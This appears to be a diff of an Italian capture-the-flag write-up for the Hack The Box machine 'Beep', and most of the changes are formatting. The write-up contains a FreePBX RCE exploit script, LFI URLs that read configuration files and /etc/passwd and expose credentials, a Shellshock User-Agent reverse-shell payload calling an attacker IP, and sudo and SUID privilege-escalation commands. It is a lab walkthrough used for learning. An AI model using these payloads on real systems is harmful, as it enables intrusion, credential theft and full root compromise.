@@ -1,8 +1,10 @@
+# Beep
+
 **Target: 10.10.10.7**
 
-# INFORMATION GATHERING
+## INFORMATION GATHERING
 
-Prima di tutto facciamo un scan veloce di [[Nmap]]
+Prima di tutto facciamo un scan veloce di \[\[Nmap]]
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/beep]                            
@@ -72,50 +74,43 @@ OS and Service detection performed. Please report any incorrect results at https
 
 Otteniamo il seguente risultato che mostra che 12 porte sono aperte:
 
-- Porta 22: esecuzione di OpenSSH 4.3
-- Porta 25: esegue Postfix smtpd
-- Porta 80: esegue Apache httpd 2.2.3
-- Porta 110: esegue Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7–7.el5_6.4
-- Porta 111: esecuzione di rpcbind
-- Porta 143: esegue Cyrus imapd 2.3.7-Invoca-RPM-2.3.7–7.el5_6.4
-- Porta 443: HTTPS in esecuzione
-- Porta 993: esegue Cyrus imapd
-- Porta 995: esegue Cyrus pop3d
-- Porta 3306: esegue MySQL
-- Porta 4445: upnotifyp in esecuzione
-- Porta 10000: esecuzione di MiniServ 1.570 (Webmin httpd)
+* Porta 22: esecuzione di OpenSSH 4.3
+* Porta 25: esegue Postfix smtpd
+* Porta 80: esegue Apache httpd 2.2.3
+* Porta 110: esegue Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7–7.el5\_6.4
+* Porta 111: esecuzione di rpcbind
+* Porta 143: esegue Cyrus imapd 2.3.7-Invoca-RPM-2.3.7–7.el5\_6.4
+* Porta 443: HTTPS in esecuzione
+* Porta 993: esegue Cyrus imapd
+* Porta 995: esegue Cyrus pop3d
+* Porta 3306: esegue MySQL
+* Porta 4445: upnotifyp in esecuzione
+* Porta 10000: esecuzione di MiniServ 1.570 (Webmin httpd)
 
 Eseguiamo uno scan completo per essere sicuro che non ci siano altre porte aperte
 
 ```bash
-
 ```
 
 Prima di passare all'enumerazione, prendiamo alcune note mentali sui risultati della scansione nmap.
 
-- La versione di OpenSSH in esecuzione sulla porta 22 è piuttosto vecchia. Siamo abituati a vedere OpenSSH versione 7.2. Quindi sarebbe una buona idea controllare searchsploit per vedere se eventuali vulnerabilità critiche sono associate a questa versione.
+* La versione di OpenSSH in esecuzione sulla porta 22 è piuttosto vecchia. Siamo abituati a vedere OpenSSH versione 7.2. Quindi sarebbe una buona idea controllare searchsploit per vedere se eventuali vulnerabilità critiche sono associate a questa versione.
+* Le porte 25, 110, 143, 995 eseguono i protocolli di posta. Potremmo aver bisogno di trovare un indirizzo email valido per enumerare ulteriormente questi servizi. La porta 4190 che esegue Cyrus timsieved 2.3.7 sembra essere associata a imapd.
+* La porta 111 esegue RPCbind. Non so molto di questo servizio, ma possiamo iniziare a enumerarlo utilizzando il comando rpcinfo che effettua una chiamata al server RPC e riporta ciò che trova. Penso che la porta 878 che esegue il servizio di stato sia associata a questo.
+* Le porte 80, 443 e 10000 eseguono server web. La porta 80 sembra reindirizzare alla porta 443, quindi abbiamo solo due server Web da enumerare.
+* La porta 3306 esegue il database MySQL. C'è molto potenziale di enumerazione per questo servizio.
+* La porta 4559 esegue HylaFAX 4.3.10. In base a ciò, HylaFAX gestisce un server fax open source che consente la condivisione di apparecchiature fax tra computer offrendo il proprio servizio ai clienti tramite un protocollo simile all'FTP. Dovremo controllare il numero di versione per vedere se è associato a qualche exploit critico.
+* La porta 5038 è in esecuzione con Asterisk Call Manager 1.1. Ancora una volta, dovremo controllare il numero di versione per vedere se è associato a qualche exploit critico.Non sono sicuro di cosa faccia il servizio upnotifyp sulla porta 4445.
 
-- Le porte 25, 110, 143, 995 eseguono i protocolli di posta. Potremmo aver bisogno di trovare un indirizzo email valido per enumerare ulteriormente questi servizi. La porta 4190 che esegue Cyrus timsieved 2.3.7 sembra essere associata a imapd.
-
-- La porta 111 esegue RPCbind. Non so molto di questo servizio, ma possiamo iniziare a enumerarlo utilizzando il comando rpcinfo che effettua una chiamata al server RPC e riporta ciò che trova. Penso che la porta 878 che esegue il servizio di stato sia associata a questo.
-
-- Le porte 80, 443 e 10000 eseguono server web. La porta 80 sembra reindirizzare alla porta 443, quindi abbiamo solo due server Web da enumerare.
-
-- La porta 3306 esegue il database MySQL. C'è molto potenziale di enumerazione per questo servizio.
-
-- La porta 4559 esegue HylaFAX 4.3.10. In base a ciò, HylaFAX gestisce un server fax open source che consente la condivisione di apparecchiature fax tra computer offrendo il proprio servizio ai clienti tramite un protocollo simile all'FTP. Dovremo controllare il numero di versione per vedere se è associato a qualche exploit critico.
-
-- La porta 5038 è in esecuzione con Asterisk Call Manager 1.1. Ancora una volta, dovremo controllare il numero di versione per vedere se è associato a qualche exploit critico.Non sono sicuro di cosa faccia il servizio upnotifyp sulla porta 4445.
-
-# ENUMERATION
+## ENUMERATION
 
 Partiamo dalla porta 443
 
-![](../zzz_rev/attachments/1*GK_AbgflFen8W_kznDyfhQ.webp)
+![](../zzz\_rev/attachments/1GK\_AbgflFen8W\_kznDyfhQ.webp)
 
 Ci troviamo di fronte un prompt di login, proviamo un po di credenziali di default ma non funzionano.
 
-Proviamo ad enumerare con [[Gobuster]]
+Proviamo ad enumerare con \[\[Gobuster]]
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/beep]
@@ -149,12 +144,11 @@ by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) & Christian Mehlma
 /vtigercrm (Status: 301)s
 ```
 
-Ho  provato le credenziali comuni e predefinite su tutti i moduli di accesso che ho trovato nelle directory e non sono arrivato da nessuna part
+Ho provato le credenziali comuni e predefinite su tutti i moduli di accesso che ho trovato nelle directory e non sono arrivato da nessuna part
 
-All'indirizzo https://10.10.10.7/recordings/  trapela la versione di FreePBX (2.8.1.4) 
-in uso ma non il numero di versione di Elastix. 
+All'indirizzo https://10.10.10.7/recordings/ trapela la versione di FreePBX (2.8.1.4) in uso ma non il numero di versione di Elastix.
 
-![](../zzz_rev/attachments/beep1.png)
+![](../zzz\_rev/attachments/beep1.png)
 
 Poiché si tratta di un software standard, il passaggio successivo consiste nell'eseguire searchsploit per determinare se è associato a eventuali vulnerabilità.
 
@@ -175,13 +169,13 @@ Papers: No Results
 
 ```
 
-Abbiamo diversi risultati 
+Abbiamo diversi risultati
 
-Gli exploit di cross-site scripting non sono molto utili poiché sono attacchi lato client e richiedono quindi l'interazione dell'utente finale. Le vulnerabilità relative all'esecuzione di codice in modalità remota (soluzione 1 RCE 18650.py ) e all'inclusione di file in locale (soluzione n. 2 LFI 37637.pl ) sono decisamente interessanti. La Blind SQL Injection è sullo script iridium_threed.php che il server non sembra caricare. Inoltre sembra che richieda l'autenticazione di un cliente, quindi eviterò questo exploit a meno che non ottenga credenziali di autenticazione valide. L'exploit PHP Code Injection si trova nella directory vtigercrm dove esiste anche la vulnerabilità LFI. Quindi lo esamineremo solo se la vulnerabilità LFI non si risolve.
+Gli exploit di cross-site scripting non sono molto utili poiché sono attacchi lato client e richiedono quindi l'interazione dell'utente finale. Le vulnerabilità relative all'esecuzione di codice in modalità remota (soluzione 1 RCE 18650.py ) e all'inclusione di file in locale (soluzione n. 2 LFI 37637.pl ) sono decisamente interessanti. La Blind SQL Injection è sullo script iridium\_threed.php che il server non sembra caricare. Inoltre sembra che richieda l'autenticazione di un cliente, quindi eviterò questo exploit a meno che non ottenga credenziali di autenticazione valide. L'exploit PHP Code Injection si trova nella directory vtigercrm dove esiste anche la vulnerabilità LFI. Quindi lo esamineremo solo se la vulnerabilità LFI non si risolve.
 
 Visitiamo https:10.10.10.7:10000 ci troviamo di fronte un prompt di login (webmin)
 
-![](../zzz_rev/attachments/beep2.png)
+![](../zzz\_rev/attachments/beep2.png)
 
 Anche questo sembra essere un software pronto all'uso e quindi la prima cosa che farò è eseguire searchsploit su di esso.
 
@@ -217,9 +211,9 @@ Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)| linux/webapps/473
 
 ```
 
-# EXPLOITATION
+## EXPLOITATION
 
-## RCE 
+### RCE
 
 Questa attacco sarò diretto alla porta 443
 
@@ -285,7 +279,7 @@ urllib.urlopen(url)
 # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)  
 ```
 
-Modifichiamo l'exploit  alle voci 
+Modifichiamo l'exploit alle voci
 
 ```bash
 import urllib
@@ -296,9 +290,9 @@ lport=1234
 extension="1000"
 ```
 
-la parte codificata nel parametro url  sembra un'iniezione di comando che invia una shell inversa alla nostra macchina d'attacco. Impostiamo un listener netcat su lhost e lport configurati per ricevere la shell inversa. 
+la parte codificata nel parametro url sembra un'iniezione di comando che invia una shell inversa alla nostra macchina d'attacco. Impostiamo un listener netcat su lhost e lport configurati per ricevere la shell inversa.
 
-ci mettiamo in ascolto con nc 
+ci mettiamo in ascolto con nc
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/beep]
@@ -310,7 +304,7 @@ ma non funziona...
 
 Proviamo a vedere cosa non va
 
-L'errore  potrebbe avere a che fare con il valore di `estension` predefinito nello script. In realtà non sappiamo se il valore 1000 è un'estensione valida. Per capirlo, dovremo utilizzare gli strumenti di sicurezza SIPVicious. In particolare, lo strumento svwar identifica le linee interne funzionanti su un PBX. Eseguiamo questo strumento per enumerare le estensioni valide.
+L'errore potrebbe avere a che fare con il valore di `estension` predefinito nello script. In realtà non sappiamo se il valore 1000 è un'estensione valida. Per capirlo, dovremo utilizzare gli strumenti di sicurezza SIPVicious. In particolare, lo strumento svwar identifica le linee interne funzionanti su un PBX. Eseguiamo questo strumento per enumerare le estensioni valide.
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/beep]
@@ -324,8 +318,7 @@ WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause 
 
 ```
 
--m: specifica un metodo di richiesta
--e: specifica un'estensione o un intervallo di estensione
+\-m: specifica un metodo di richiesta -e: specifica un'estensione o un intervallo di estensione
 
 modifichiamo il valore `estension` con quello trovato e rilanciamo l'exploti
 
@@ -343,7 +336,6 @@ whoami
 asterisk
 
 ```
-
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/beep]
@@ -379,8 +371,7 @@ cat user.txt
 bash-3.2$ 
 ```
 
-
-## [[Local File Inclusion LFI]]
+### \[\[Local File Inclusion LFI]]
 
 Questo attacco prende sempre di mira la porta 443 ma utilizzeremo una LFI
 
@@ -459,13 +450,11 @@ print "\n[-] not successful\n";
         }   
 ```
 
-Visitando al pagina `https://10.10.10.7//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`  ci rendiamo conto che l'applicazione è decisamente vulnerabile. 
+Visitando al pagina `https://10.10.10.7//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action` ci rendiamo conto che l'applicazione è decisamente vulnerabile.
 
-![](../zzz_rev/attachments/beep3.png)
+![](../zzz\_rev/attachments/beep3.png)
 
-Facciamo clic con il tasto destro sulla pagina e selezionare Visualizza sorgente pagina per formattare la pagina.
-![](../zzz_rev/attachments/beep4.png)
-Vediamo che abbiamo un sacco di credenziali. Le più importanti sembrano le seguenti:
+Facciamo clic con il tasto destro sulla pagina e selezionare Visualizza sorgente pagina per formattare la pagina. ![](../zzz\_rev/attachments/beep4.png) Vediamo che abbiamo un sacco di credenziali. Le più importanti sembrano le seguenti:
 
 ```bash
 
@@ -478,11 +467,9 @@ ARI_ADMIN_USERNAME=admin
 ARI_ADMIN_PASSWORD=jEhdIekWmdjE
 ```
 
-
 Proviamo ad accede via tramite ssh
 
->FIX ERROR:
-> non mi faceva accedere al servizio ssh, dandomi il seguente errore
+> FIX ERROR: non mi faceva accedere al servizio ssh, dandomi il seguente errore
 
 ```bash
 ┌──(root㉿kali)-[~/.ssh]
@@ -490,10 +477,8 @@ Proviamo ad accede via tramite ssh
    Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
 ```
 
- >si verifica quando il client SSH non riesce a trovare un metodo di scambio delle chiavi supportato dal server SSH remoto. In questo caso, il server offre i seguenti metodi di scambio delle chiavi: diffie-hellman-group-exchange-sha1, diffie-hellman-group14-sha1, diffie-hellman-group1-sha1.
-  Questo errore può verificarsi quando il client SSH ha restrizioni o configurazioni specifiche che limitano i metodi di scambio delle chiavi supportati. Potrebbe essere necessario abilitare o aggiornare i metodi di scambio delle chiavi nel client SSH per consentire una corretta negoziazione con il server.
-  Per risolvere il problema, apriamo il file di configurazione del client SSH (solitamente situato in /etc/ssh/ssh_config o ~/.ssh/config) e assicurati che i metodi di scambio delle chiavi supportati siano abilitati. Possiamo  aggiungere o modificare la seguente linea nel file di configurazione:
-  
+> si verifica quando il client SSH non riesce a trovare un metodo di scambio delle chiavi supportato dal server SSH remoto. In questo caso, il server offre i seguenti metodi di scambio delle chiavi: diffie-hellman-group-exchange-sha1, diffie-hellman-group14-sha1, diffie-hellman-group1-sha1. Questo errore può verificarsi quando il client SSH ha restrizioni o configurazioni specifiche che limitano i metodi di scambio delle chiavi supportati. Potrebbe essere necessario abilitare o aggiornare i metodi di scambio delle chiavi nel client SSH per consentire una corretta negoziazione con il server. Per risolvere il problema, apriamo il file di configurazione del client SSH (solitamente situato in /etc/ssh/ssh\_config o \~/.ssh/config) e assicurati che i metodi di scambio delle chiavi supportati siano abilitati. Possiamo aggiungere o modificare la seguente linea nel file di configurazione:
+
 ```bash
 KexAlgorithms diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
 ```
@@ -518,10 +503,9 @@ Non funziona
 
 Proviamo ad usare LFI per estrarre gli utenti della macchina
 
-`https://10.10.10.7//vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
+\`https://10.10.10.7//vtigercrm/graph.php?current\_language=../../../../../../../..//etc/passwd%00\&module=Accounts\&action
 
-![](../zzz_rev/attachments/beep5.png)
-sempre andando a vedere il codice sorgente abbiamo la corretta formattazione degli utenti 
+![](../zzz\_rev/attachments/beep5.png) sempre andando a vedere il codice sorgente abbiamo la corretta formattazione degli utenti
 
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -583,12 +567,11 @@ root
 [root@beep ~]# 
 ```
 
-
-## ShellShock
+### ShellShock
 
 Proviamo ad attaccare il prompt di login sulla porta 1000
 
-Inviamo un richiesta di login ed analizziamola con [[BurpSuite]]
+Inviamo un richiesta di login ed analizziamola con \[\[BurpSuite]]
 
 ```bash
 POST /session_login.cgi HTTP/1.1 Host: 10.10.10.7:10000 
@@ -606,14 +589,13 @@ Upgrade-Insecure-Requests: 1
 page=%2F&user=root&pass=root
 ```
 
-Crea una richiesta POST a /session_login.cgi.
+Crea una richiesta POST a /session\_login.cgi.
 
-Ogni volta che c'è CGI , proviamo ad utilizzare la vulnerabilità [[Shocker|ShellShock]]. 
-Per testare, trasferirò la richiesta di accesso a Repeater e sostituirò l'intestazione User-Agent con la stringa exploit Shellshock 
+Ogni volta che c'è CGI , proviamo ad utilizzare la vulnerabilità \[\[Shocker|ShellShock]]. Per testare, trasferirò la richiesta di accesso a Repeater e sostituirò l'intestazione User-Agent con la stringa exploit Shellshock
 
 `User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.53/4444 0>&1`
 
-Prima ci mettiamo in ascolto con nc 
+Prima ci mettiamo in ascolto con nc
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/beep]
@@ -655,10 +637,9 @@ root
 [root@beep webmin]# 
 ```
 
+## PRIVESC
 
-# PRIVESC
-
-## Privesc Nmap
+### Privesc Nmap
 
 Una volta dentro proviamo a lanciare `sudo -l`
 
@@ -689,8 +670,7 @@ User asterisk may run the following commands on this host:
 
 ```
 
-Vediamo che possiamo eseguire [Nmap] come sudo 
-Eseguirò nmap come root e poi ![command] per eseguire un comando, come bash:
+Vediamo che possiamo eseguire \[Nmap] come sudo Eseguirò nmap come root e poi !\[command] per eseguire un comando, come bash:
 
 ```bash
 sudo nmap --interactive
@@ -705,11 +685,9 @@ cat /root/root.txt
 
 ```
 
+### Privesc chmod
 
-## Privesc chmod
-
-Come visto in precedenza con `sudo -l` possiamo anche eseguire chmod con privilegi di root
-Sceglierò un file, come /bin/bash, e lo imposterò su SUID:
+Come visto in precedenza con `sudo -l` possiamo anche eseguire chmod con privilegi di root Sceglierò un file, come /bin/bash, e lo imposterò su SUID:
 
 ```bash
 bash-3.2$ ls -l /bin/bash
@@ -727,13 +705,12 @@ bash-3.2$ bash -p
 bash-3.2# id uid=100(asterisk) gid=101(asterisk) euid=0(root)
 ```
 
-# LESSON LEARNED
+## LESSON LEARNED
 
-Ci sono diversi modi per ottenere il root della macchina, quelli presentati qui includono 
+Ci sono diversi modi per ottenere il root della macchina, quelli presentati qui includono
 
-- Una RCE relativo all'applicativo FreePBX / Elastix
-- Una LFI dell'applicativo FreePBX / Elastix
-- ShellShocker 
+* Una RCE relativo all'applicativo FreePBX / Elastix
+* Una LFI dell'applicativo FreePBX / Elastix
+* ShellShocker
 
 Per la privesc abbiamo utilizzato delle misconfiguration di Nmap e chmod
-
